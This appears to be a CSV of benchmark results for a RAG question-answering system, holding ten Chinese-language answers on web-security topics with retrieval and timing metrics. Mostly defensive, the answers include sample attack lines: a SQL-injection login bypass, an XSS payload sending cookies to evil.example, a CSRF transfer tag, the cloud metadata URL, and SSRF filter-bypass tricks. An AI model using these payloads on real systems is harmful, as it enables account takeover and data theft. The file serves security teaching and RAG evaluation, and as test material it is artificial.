taskId,taskName,mode,itemId,question,answer,retrievalTimeMs,generationTimeMs,totalTimeMs,promptTokens,completionTokens,retrievalHit,precisionAtK,recallAtK,ndcgAtK,mrr,keywordHitRate,citationMatched,route,rerankUsed,contextTokens,manualCorrectness,manualRelevance,manualCompleteness,manualHallucination,error
15,E5-A-向量Top5-KB4,RAG_LLM,1,什么是 SQL 注入?如何防御?,"# SQL 注入：定义、原理与防御  ## 一、什么是 SQL 注入  SQL 注入(SQL Injection, CWE-89)是一种将恶意 SQL 语句插入应用程序查询参数，从而欺骗后端数据库执行非预期命令的攻击方式。它长期位居 OWASP Top 10 漏洞列表前列，可能导致**数据泄露、数据篡改、认证绕过甚至服务器接管** [2]。  ## 二、攻击原理  当应用程序将用户输入**直接拼接**进 SQL 语句时，攻击者可以构造特殊输入改变语句逻辑 [2]。以登录场景为例：  ```sql -- 拼接式查询(危险) SELECT * FROM users WHERE username = '输入1' AND password = '输入2' ```  若攻击者在用户名处输入 `admin' --`,拼接后的语句变为：  ```sql SELECT * FROM users WHERE username = 'admin' --' AND password = '...' ```  `--` 之后的内容被注释，**密码校验被完全绕过**。更严重的情况下，攻击者可利用 `UNION SELECT` 读取任意表数据，或利用数据库特性执行系统命令 [3]。  ## 三、常见攻击类型  1. **基于布尔的盲注**：通过页面返回差异逐位猜测数据 [3] 2. **基于时间的盲注**：利用 `SLEEP()` 等函数根据响应时间推断数据 [3] 3. **UNION 注入**：利用 `UNION SELECT` 合并查询结果直接读取数据 [3] 4. **堆叠查询**：分号后追加第二条语句(取决于数据库与驱动配置)[3]  ## 四、防御措施  ### 1. 参数化查询(首选)  使用预编译语句(Prepared Statement),用户输入**只作为数据绑定，不参与 SQL 语法解析** [3][4]:  ```java // Java JDBC String sql = ""SELECT * FROM users WHERE username = ? AND password = ?""; PreparedStatement ps = conn.prepareStatement(sql); ps.setString(1, username); ps.setString(2, password); ```  ### 2. 使用 ORM 框架并规范占位符  以 MyBatis 为例，应使用 `#{}` 占位符实现参数化绑定，**严禁使用 `${}` 直接拼接** [4]。  ### 3. 动态排序字段白名单  对于无法参数化的场景(如动态排序字段)，应采用**白名单映射**方式处理，而非直接拼接用户输入 [1]:  ```java // 示例:排序字段白名单映射 Map<String, String> sortWhitelist = Map.of(     ""createTime"", ""create_time"",     ""userName"", ""username"" ); String column = sortWhitelist.getOrDefault(inputSort, ""create_time""); ```  ### 4. 补充：AI 生成 SQL 场景的独立校验  若系统输出(如大模型生成的内容)被用于生成或执行 SQL,必须经过**独立校验或沙箱环境**，不可直接执行 [5]。  ---  **核心原则总结**：SQL 注入的根本原因是“用户输入参与了 SQL 语法解析”。防御上应优先采用参数化查询使输入与代码分离 [3][4],配合 ORM 规范占位符 [4] 和动态字段白名单机制 [1],从根源上消除拼接风险。",201,18576,18778,1127,1109,1,0.6000,1.0000,0.7328,0.5000,0.7500,1,,0,808,0,0,0,0
15,E5-A-向量Top5-KB4,RAG_LLM,2,MyBatis 中 #{} 和 ${} 的区别是什么?,"# MyBatis 中 `#{}` 与 `${}` 的区别  ## 一、核心区别  | 对比项 | `#{}` | `${}` | |--------|-------|-------| | 处理方式 | 参数化绑定(占位符) | 字符串直接拼接 | | SQL 注入风险 | 安全 | 存在注入风险 | | 使用建议 | 应全部使用 | 严禁用于拼接用户输入 |  - **`#{}`**:MyBatis 使用 `#{}` 占位符即**参数化绑定**，参数不参与 SQL 语句结构的拼接，是防注入的正确方式 [2]。 - **`${}`**:属于**字符串拼接**，用户输入会直接嵌入 SQL 语句文本中，攻击者可以借此改变 SQL 语义，存在注入风险 [2]。  ## 二、代码对比  知识库中给出的典型示例 [2]:  ```xml <!-- 正确: 参数化 --> <select id=""findUser"">SELECT * FROM users WHERE id = #{id}</select>  <!-- 危险: 字符串拼接, 存在注入风险 --> <select id=""bad"">SELECT * FROM users ORDER BY ${column}</select> ```  ## 三、安全实践建议  1. **全部使用 `#{}`**:MyBatis 全部使用 `#{}` 是 SQL 注入防护的基本要求 [1]。  2. **动态排序字段用白名单映射**：类似 `ORDER BY ${column}` 这类无法参数化的场景(表名、列名、排序方向)，应采用**白名单映射**，只允许预设的合法值 [1][2]。  3. **配合输入校验**：对输入进行白名单校验(类型、长度、格式、字符集)，例如 ID 参数只允许数字，作为纵深防御手段 [2]。  > 补充说明(通用安全常识，无知识库引用):`#{}` 底层通常依赖 JDBC 的 `PreparedStatement` 预编译机制，参数以占位符形式传入；而 `${}` 是在 SQL 生成阶段直接做文本替换，因此任何用户可控内容进入 `${}` 都可能被解释为 SQL 语法的一部分。  ## 四、一句话总结  `#{}` 是参数化绑定，天然防注入;`${}` 是字符串拼接，存在注入风险。业务代码应**一律使用 `#{}`**,遇到动态表名/列名/排序等场景，改用**白名单映射**处理，切勿直接拼接用户输入 [1][2]。",160,20587,20747,959,995,1,0.2000,1.0000,0.6309,0.5000,1.0000,1,,0,633,0,0,0,0
15,E5-A-向量Top5-KB4,RAG_LLM,3,XSS 有哪几种类型?分别如何防御?,"# XSS 类型与防御  ## 一、XSS 的三种类型  根据知识库,跨站脚本攻击(Cross-Site Scripting, CWE-79)是指攻击者向 Web 页面注入恶意脚本,当其他用户浏览该页面时,脚本在受害者浏览器中执行,从而窃取会话 Cookie、篡改页面、发起钓鱼或键盘记录等攻击 [1]。其分为三种类型 [1]:  | 类型 | 特点 | 典型场景 | |------|------|----------| | **反射型 XSS** | 恶意脚本来自用户请求参数,服务器将其""反射""回响应页面 | 搜索结果页 | | **存储型 XSS** | 恶意脚本被持久化存储到数据库(如评论、个人简介),**所有访问者都会执行,危害最大** | 评论区、个人资料 | | **DOM 型 XSS** | 由前端 JavaScript 不当操作 DOM 引起(如 `innerHTML` 写入未净化的 URL 参数),数据**不经过服务器** | 前端动态渲染逻辑 |  攻击示例:评论功能未过滤输出时,攻击者可提交如下payload,窃取访问者的 Cookie [1]:  ```html <script>fetch('https://evil.example/steal?c=' + document.cookie)</script> ```  ## 二、防御措施  ### 1. 知识库中可依据的内容  当前知识库片段中,XSS 防护指南 [1] 仅涵盖类型定义与攻击示例,**未包含完整的防御章节**。知识库中与 XSS 防御直接相关的依据仅有:  - **输出渲染前处理**:输出在渲染前端前需经 XSS 处理 [3](该条出自大模型应用安全场景,但其原则同样适用于常规 Web 输出); - **修复 XSS 是 CSRF 防御的前置条件**:XSS 脚本可以读取页面中的 CSRF Token,从而绕过 Token 防御,因此必须先修复 XSS [2]。  ### 2. 通用知识补充(无知识库引用,以下为通用安全常识)  **⚠️ 说明:当前知识库中未找到充分的 XSS 专项防御依据,以下内容为通用安全常识补充,不标注知识库引用编号。**  #### 反射型 / 存储型 XSS 防御 1. **输出编码(核心)**:根据输出上下文做转义——HTML 正文用 HTML 实体编码(`<` → `&lt;`),JS 上下文、URL 上下文、CSS 上下文需使用对应的专用编码,避免""一套编码到处用""; 2. **输入校验**:对用户输入做白名单格式校验(如邮箱、手机号),但**不能仅依赖输入过滤**,因为存储型数据可能在多种上下文输出; 3. **使用成熟净化库**:对需要保留富文本的场景,使用 DOMPurify 等成熟库做白名单净化,禁止自行编写正则过滤; 4. **模板自动转义**:优先使用默认开启自动转义的模板引擎,慎用 `|safe`、""raw"" 等绕过转义的能力。  #### DOM 型 XSS 防御 1. **避免将不可信数据写入 `innerHTML` / `document.write` / `eval`**,改用 `textContent`、`setAttribute` 等安全 API; 2. 对 URL 类参数使用 `encodeURIComponent` 编码后再拼接,并校验协议白名单(仅允许 `http/https`),防止 `javascript:` 伪协议注入。  #### 纵深防御(通用) 1. **设置 Cookie 属性**:`HttpOnly`(阻止 JS 读取 Cookie,缓解窃取)、`Secure`、`SameSite`; 2. **部署 CSP(Content Security Policy)**:限制脚本来源,禁止内联脚本执行,即使注入成功也难以运行; 3. **最小权限与审计**:会话短有效期、敏感操作二次确认,降低 XSS 成功后的危害面。  ---  **总结**:知识库 [1] 完整回答了""三种类型""的问题;防御部分知识库仅有零散依据 [2][3],系统性防御方案(输出编码、CSP、HttpOnly 等)为通用安全常识补充,建议在实际工程中以 OWASP XSS Prevention Cheat Sheet 等权威资料为准。",168,43159,43329,1516,1673,1,0.2000,1.0000,1.0000,1.0000,1.0000,1,,0,1140,0,0,0,0
15,E5-A-向量Top5-KB4,RAG_LLM,4,CSRF 攻击的原理是什么?有哪些防御手段?,"# CSRF 攻击原理与防御手段  ## 一、攻击原理  跨站请求伪造(Cross-Site Request Forgery, CWE-352)是指攻击者诱导已登录用户的浏览器，在用户不知情的情况下向目标站点发送恶意请求。由于请求携带了用户的合法会话凭证(如 Cookie),服务器难以区分这是否为用户本人意愿，从而以用户身份执行了操作 [1]。  ### 攻击示例  以银行转账场景为例：用户已登录 `bank.example`,会话 Cookie 仍然有效。攻击者在第三方页面埋入如下代码 [1]:  ```html <img src=""https://bank.example/transfer?to=attacker&amount=10000""> ```  用户访问该页面时，浏览器自动携带 Cookie 发起转账请求，攻击完成 [1]。  ### 攻击成立的关键条件  1. 受害者在目标站点持有有效会话； 2. 目标操作仅需 Cookie 即可认证，无二次确认； 3. 攻击者能诱导受害者访问恶意页面 [1]。  ## 二、防御手段  ### 1. CSRF Token(主流方案)  服务器为每个会话生成随机 Token,嵌入表单或请求头；请求到达时校验 Token 是否匹配。攻击者无法跨站读取该 Token,伪造请求即告失败 [2]。  ```html <form method=""post"" action=""/transfer"">  <input type=""hidden"" name=""_csrf"" value=""随机Token"">  ... </form> ```  补充：Spring Security 默认启用 CsrfFilter,对非幂等请求(POST/PUT/DELETE)校验 `_csrf` 参数或 `X-CSRF-TOKEN` 头 [2]。  ### 2. SameSite Cookie  现代浏览器支持 SameSite 属性，限制 Cookie 在跨站请求中发送 [2]:  ``` Set-Cookie: SESSIONID=xxx; SameSite=Lax; Secure; HttpOnly ```  - `Strict`:完全不跨站发送； - `Lax`:导航级 GET 请求允许携带(浏览器默认)[4]。  ### 3. 校验 Origin 与 Referer  对敏感请求检查 `Origin`/`Referer` 头是否为本站域名，拒绝来源不明的跨站请求 [4]。  ### 4. 避免 GET 产生副作用  严格遵守 HTTP 语义：查询用 GET,修改用 POST/PUT/DELETE,从根源上杜绝 img/script 标签型 CSRF [4]。  ### 5. 二次认证  对转账、改密、删除等高危操作要求再次输入密码、验证码或动态口令 [4]。  ## 三、注意事项：CSRF 与 XSS 的关系  - CSRF 利用服务器对浏览器的信任，攻击的是“用户身份”；XSS 利用站点对输出的信任，攻击的是“浏览器执行环境” [4]。 - XSS 通常可以用来绕过 CSRF Token 防御(脚本可读取 Token),因此**修复 XSS 是 CSRF 防御的前置条件** [4]。  ---  **小结**：CSRF 的核心是“借用”用户浏览器中已有的合法凭证发起伪造请求。防御上建议以 **CSRF Token + SameSite Cookie** 为主，辅以 Origin/Referer 校验、HTTP 语义规范和高危操作二次认证，形成纵深防御；同时优先修复 XSS 漏洞，避免 Token 机制被绕过 [1][2][4]。",243,18594,18838,1341,995,1,0.6000,1.0000,0.9675,1.0000,1.0000,1,,0,983,0,0,0,0
15,E5-A-向量Top5-KB4,RAG_LLM,5,SSRF 是什么?云环境中最典型的危害是什么?,# SSRF 是什么？  **服务端请求伪造**是指攻击者诱使服务器端应用向攻击者指定的地址发起请求 [1]。  其核心危害在于：请求是由**内网服务器**发出的，而非攻击者直接发起，因此攻击者可借此：  - **探测内网**：通过返回差异或超时时间推断内网主机与端口存活情况 [1] - **访问内网服务**：直接请求内网中本不该对外暴露的服务 [1] - **读取云平台元数据**：获取敏感凭证信息 [1] - **借助内网管理接口控制服务器** [1] - **滥用危险协议**：如利用 `file://` 读取本地文件、利用 `gopher://`、`dict://` 构造任意报文 [1]  该漏洞对应 CWE-918 [1]，在 OWASP Top 10 2021 中位列 **A10:2021** [4]，在 OWASP API 安全 Top 10 中对应 **API7: SSRF** [3]。  ---  # 云环境中最典型的危害：云元数据泄露  根据知识库，云环境中最典型的危害是**云元数据泄露** [1]：  - **攻击方式**：SSRF 可请求云平台元数据服务，例如：   ```   http://169.254.169.254/latest/meta-data/   ``` - **危害后果**：攻击者可获取**实例凭证**，进而**接管云资源** [1]。  这意味着一次看似普通的 SSRF 漏洞，可能导致攻击者从“探测内网”升级为“完全接管云端基础设施”，危害被显著放大。  ---  # 延伸：SSRF 的常见绕过技巧（了解攻击面）  攻击者常用以下方式绕过基于字符串的黑名单校验 [1]：  | 绕过手段 | 示例 | |---|---| | 十进制 IP | 用 `2130706433` 代替 `127.0.0.1` | | 短链接 | 跳转到内网地址 | | DNS 重绑定 | 解析结果动态切换为内网 IP | | 特殊地址表示 | `0.0.0.0`、`[::1]` |  ---  # 防御要点  知识库给出的核心防御方案 [3]：  1. **白名单目标**：仅允许请求明确授权的地址 2. **禁用危险协议**：封禁 `file://`、`gopher://`、`dict://` 等 3. **解析后校验 IP**：在 DNS 解析完成后校验实际 IP，防止 DNS 重绑定绕过 4. **网络隔离**：限制服务器发起出站请求的能力  > 补充说明：结合绕过技巧可见，简单的黑名单过滤并不可靠，应优先采用“白名单 + 解析后校验 + 网络层隔离”的纵深防御思路 [1][3]。,238,19509,19748,1478,988,1,0.2000,1.0000,1.0000,1.0000,0.8000,1,,0,1083,0,0,0,0
15,E5-A-向量Top5-KB4,RAG_LLM,6,JWT 常见的安全风险有哪些?,"# JWT 常见安全风险  根据知识库内容，JWT 的常见安全风险主要有以下五类：  ## 1. 算法混淆攻击  服务端若信任 Header 中声明的算法，攻击者可将 `alg` 改为 `none`,或将 RS256 篡改为 HS256(用公钥当 HMAC 密钥)，从而伪造合法签名。  **防御措施**：服务端硬编码固定算法，不从 Token 中读取。[1]  ## 2. 密钥强度不足与硬编码  - 弱密钥(如 `secret`、`123456`)可被暴力破解 - 硬编码在源码中的密钥一旦泄露，即全面失守  **防御措施**：密钥仅通过环境变量或密钥管理服务注入，长度不低于 256 位。[4]  ## 3. 敏感信息泄露  JWT 的 Payload 仅做 Base64 编码，内容是明文可读的，严禁在其中存放密码、手机号等敏感数据。[4]  ## 4. Token 无法主动失效  JWT 是无状态的，签发后在过期前始终有效。当用户改密、注销或账号被盗时，需要额外的失效机制。  **防御措施**： - 引入服务端黑名单(如 Redis) - 缩短有效期，配合刷新令牌 - 在签名中加入版本号，随密钥变更而失效 [4]  ## 5. 存储位置风险  - **localStorage**:易受 XSS 攻击窃取，需配套严格的 XSS 防御 - **HttpOnly Cookie**:天然防 XSS 窃取，但需配套 CSRF 防御 [4]  ---  **小结**：JWT 的风险贯穿“签发—传输—存储—失效”全生命周期，核心防御思路是：**固定算法、强密钥管理、不在 Payload 存敏感数据、建立主动失效机制、选择合适的存储位置并配套防护**。[1][4]",162,15191,15354,1591,789,1,0.4000,1.0000,0.8772,1.0000,0.6000,1,,0,1187,0,0,0,0
15,E5-A-向量Top5-KB4,RAG_LLM,7,文件上传功能有哪些安全风险?如何防范?,"# 文件上传功能的安全风险与防范  ## 一、主要安全风险  根据知识库内容，文件上传功能是 Web 攻击的高发入口，主要风险包括以下五类 [1]:  | 风险类型 | 说明 | |---------|------| | **WebShell 上传** | 上传可执行脚本(如 `shell.jsp`、`shell.php`),直接获得服务器控制权 [1] | | **目录穿越** | 利用 `../../` 将文件写到任意路径,覆盖关键配置 [1] | | **存储型 XSS** | 上传含脚本的 HTML/SVG 文件并被浏览器直接渲染 [1] | | **拒绝服务(DoS)** | 上传超大文件或畸形压缩包耗尽磁盘与内存 [1] | | **恶意文件分发** | 服务器被当作恶意文件中转站 [1] |  ## 二、防御措施  ### 1. 严格校验文件类型(白名单)[1]  - **扩展名白名单**：仅允许确定安全的扩展名(如 pdf、txt、md、docx),拒绝一切可执行扩展名 [1] - **文件头校验(Magic Number)**:防止攻击者仅修改扩展名绕过校验；但需注意文件头本身可被伪造，因此白名单 + 头校验必须**配合使用**，不可只依赖单一手段 [1] - **内容解析校验**：使用成熟解析库读取文件内容，拒绝解析失败或内容异常的文件 [1]  ### 2. 重命名存储 [1]  知识库中提到了“重命名存储”这一防御措施，但具体内容在当前片段中不完整。以下为通用安全常识补充(**无知识库引用**)：  - 使用随机生成的文件名(如 UUID)替换用户上传的原始文件名，避免路径注入和文件名冲突 - 存储目录应与 Web 可执行目录隔离，或部署在静态资源服务器/OSS 上，确保上传文件**不可被当作脚本执行** - 对文件大小、数量设置上限，缓解拒绝服务风险 - 对 HTML/SVG 等可渲染文件，通过 `Content-Disposition: attachment` 或 CSP 限制浏览器直接执行其中脚本 - 结合病毒扫描、访问权限控制与上传日志审计，实现纵深防御  ## 三、小结  文件上传防御的核心思路是：**默认拒绝 + 白名单放行**(类型校验)[1],配合**存储隔离**(重命名、不可执行目录)[1],再加上通用的资源限制与监控手段(通用知识补充)，形成多层防御体系，而非依赖任何单一校验点。",177,29074,29252,1294,985,1,0.2000,1.0000,1.0000,1.0000,0.5000,1,,0,939,0,0,0,0
15,E5-A-向量Top5-KB4,RAG_LLM,8,BOLA 和 BFLA 的区别是什么?,"# BOLA 与 BFLA 的区别  ## 一句话区分  - **BOLA（对象级授权失效）**：管的是“**这条数据是不是你的**”——用户能访问到不属于自己的**数据对象** [1]。 - **BFLA（功能级授权失效）**：管的是“**你能不能用这个功能**”——用户能调用本不该有权使用的**接口/功能**，尤其常见于管理功能接口暴露 [2]。  ---  ## BOLA：对象级授权失效  ### 漏洞本质  API 只验证了“你是谁”（认证），却没有验证“这个对象是不是你的”（授权），导致**横向越权** [1]：  ```http GET /api/invoices/5001   # A 用户查看自己的发票 → 200 GET /api/invoices/5002   # A 用户查看 B 用户的发票 → 若无归属校验, 同样 200 ```  BOLA 位列 OWASP API Security Top 10 之首，是数据泄露事件的最主要根因 [1]。  ### 高发场景 [1]  1. 自增整数主键暴露，易于遍历（5001 → 5002 → ...） 2. UUID 被误认为“不可猜测即安全”（一旦泄露仍可越权） 3. 批量接口、导出接口、子资源路径（`/users/{id}/orders`）遗漏校验 4. 导航/回退接口复用了宽权限查询  ---  ## BFLA：功能级授权失效  知识库中关于 BFLA 的直接描述较为有限，仅明确其关注**管理功能接口暴露**问题，且在 OWASP API 2023 版中与 BOLA 相关条目并列存在 [2]。  以下为补充的通用安全常识（无知识库引用）：BFLA 的典型表现是“认证了、但没授权”，即普通用户也能调用本应仅限管理员使用的接口，例如：  ```http DELETE /api/admin/users/123   # 普通用户调用管理员删除接口 → 若无角色校验, 可能执行成功 ```  两者的越权方向不同：  | 维度 | BOLA | BFLA | |------|------|------| | 授权对象 | 数据对象（发票、订单、用户资料） | API 功能/接口（删除、导出、管理操作） | | 越权方向 | 横向越权（同级用户互访数据） [1] | 纵向越权（低权限调用高权限功能，通用知识） | | 典型问题 | 查询未校验数据归属 [1] | 管理接口暴露、未做角色校验 [2] |  ---  ## 防御要点  ### 针对 BOLA  每次数据访问都把“归属”写进查询条件 [1]，即查询时带上当前用户标识过滤，而非取回数据后再判断。  ### 针对 BFLA  知识库 [2] 仅指出问题在于管理功能接口暴露。补充通用做法（无知识库引用）：采用集中式授权中间件、默认拒绝、按角色显式声明接口可访问范围。  ### 通用工程实践  在代码评审时，将“新接口是否做了认证与授权（BOLA/BFLA）”作为强制检查项 [3]。  ---  ## 补充说明  知识库片段 [1] 对 BOLA 的原理、场景与防御描述充分，但对 BFLA 的机制细节着墨较少，本回答中关于 BFLA 越权方向（纵向越权）与具体示例的部分为**通用安全常识补充，无知识库引用**，已明确标注。",180,33997,34178,1364,1436,1,0.2000,1.0000,1.0000,1.0000,1.0000,1,,0,971,0,0,0,0
15,E5-A-向量Top5-KB4,RAG_LLM,9,为什么不能使用 MD5 存储密码?应该用什么?,"# 为什么不能使用 MD5 存储密码？  ## 一、MD5 存储密码的核心问题  ### 1. MD5 本身是“快速哈希”，天然不适合存密码  MD5 的设计目标是快速计算数据摘要，而非抵抗密码破解。正因为它计算速度极快，攻击者使用**彩虹表与暴力破解**即可轻易还原密码，安全性评级为“危险”[2]。  ### 2. 加盐 MD5 也不够安全  有人认为“给 MD5 加个盐就安全了”，但知识库明确指出加盐 MD5 安全性“不足”，原因有二[2]:  - **盐可被一同拖库**： 盐通常与哈希值存在同一数据库中，数据泄露时攻击者能同时拿到盐和哈希值； - **GPU 算力碾压**： 即使加了盐，GPU 每秒仍可计算数十亿次哈希，暴力破解成本极低。  > 小结： 密码存储的关键不是“有没有盐”，而是“破解一次的计算成本够不够高”。MD5 无论加不加盐，都算得太快了。  ## 二、应该用什么？—— 自适应慢哈希算法  ### 推荐方案  使用 **PBKDF2 / BCrypt / Argon2**,它们的特点是“**自适应慢哈希 + 盐**”，且成本参数可随硬件升级而调大，始终保持足够的破解成本[2]。  ### BCrypt 的核心原理 [2]  1. **自带随机盐**： 相同密码每次哈希结果都不同，天然抗彩虹表； 2. **成本因子**： 哈希轮数为 `2^cost`,可随硬件进步调大，持续抬高破解成本； 3. **输出自包含**： 哈希串如 `$2a$10$N9qo8uLOickgx2ZMRZoMye...` 内含算法版本、成本因子、盐与哈希值，校验时直接从串中解析，无需单独存储盐。  推荐成本因子为 **10-12**(每次哈希约 60-250ms),以合理的登录延迟换取攻击者高昂的破解成本[2]。  ## 三、代码实践示例(Spring Boot)[4]  Spring Boot 中应使用 `BCryptPasswordEncoder` 存储密码，明确禁止 MD5/SHA1 等明文级方案[4]:  ```java @Bean public PasswordEncoder passwordEncoder() {     return new BCryptPasswordEncoder(); // 默认强度 10 }  // 注册时:对明文密码哈希 String hash = passwordEncoder.encode(rawPassword);  // 登录时:校验密码与存储的哈希是否匹配 boolean ok = passwordEncoder.matches(rawPassword, storedHash); ```  ## 四、总结  | 方案 | 结论 | |------|------| | 明文 | 危险，泄露即直接暴露 [2] | | MD5/SHA1 | 危险，快速哈希易被彩虹表和暴力破解 [2] | | 加盐 MD5 | 不足，盐随库泄露且 GPU 破解极快 [2] | | **PBKDF2/BCrypt/Argon2** | **推荐，自适应慢哈希+盐，成本可随硬件升级** [2] |  一句话：**MD5 算得太快，不适合存密码；应改用 BCrypt 等自适应慢哈希算法，让“验证一次”和“破解一次”的成本差达到最大化。**",233,22155,22389,1525,1124,1,0.2000,1.0000,0.6309,0.5000,1.0000,1,,0,1070,0,0,0,0
15,E5-A-向量Top5-KB4,RAG_LLM,10,RAG 系统的完整流程是什么?,"# RAG 系统的完整流程  ## 一、核心思想  RAG(Retrieval-Augmented Generation, 检索增强生成)采用**""先检索、后生成""的两阶段架构**：用户提问后，系统先从外部知识库检索相关内容，再将其作为上下文交给 LLM 生成回答，以此缓解大语言模型的知识截止、幻觉、私域知识缺失三大缺陷 [1]。  ## 二、离线索引阶段(五个步骤)[1]  1. **文档解析**：提取 PDF/TXT/MD/DOCX 等格式的文本内容； 2. **清洗**：去除控制字符、页眉页脚、乱码等噪声； 3. **分块**:按语义边界与固定长度切分为 chunk,通常 256–1024 字符，相邻块保留重叠以保持语义连贯； 4. **向量化**：使用 Embedding 模型将每个 chunk 映射为稠密向量； 5. **入库**：向量与原文、元数据(文档名、页码、块序号)一同存入向量数据库。  ## 三、在线问答阶段  知识库中对在线阶段的**高层描述**为：用户提问 → 从知识库检索相关内容 → 将检索结果作为上下文拼入提示词 → LLM 生成回答 [1]。  需要说明的是：知识库片段中“在线问答阶段”的**详细步骤(如查询向量化、相似度检索、重排序等)未完整给出**，以下为按通用 RAG 实践补充的典型环节(属通用知识，无知识库引用)：  - **查询处理**：将用户问题同样通过 Embedding 模型向量化； - **相似度检索**：在向量数据库中计算向量相似度，召回 Top-K 相关 chunk; - **上下文组装**：将检索到的 chunk 与用户问题拼接为提示词(检索片段应用明确分隔符包裹，与用户问题区分，防止间接注入)[2]; - **生成回答**：LLM 基于组装后的上下文生成最终回答。  ## 四、安全提示  在上述流程中，""检索内容拼入上下文”这一环节是 RAG 特有的攻击面：攻击者可将恶意指令藏进知识库文档，当该 chunk 被检索命中并拼入上下文时触发**间接提示注入** [3]。因此在实施 RAG 流程时，应同步落实输入与检索内容隔离、输出约束、检索权限最小化及监控审计等防御措施 [2][3]。  ---  **引用说明**：离线索引五步与整体两阶段架构引自 [1];检索片段隔离措施引自 [2];间接注入风险引自 [3]。在线问答阶段的详细执行步骤(查询向量化、Top-K 召回、重排序等)在当前知识库中未找到充分依据，已标注为通用安全常识补充。",230,33122,33353,1410,1283,1,0.2000,1.0000,1.0000,1.0000,1.0000,1,,0,989,0,0,0,0
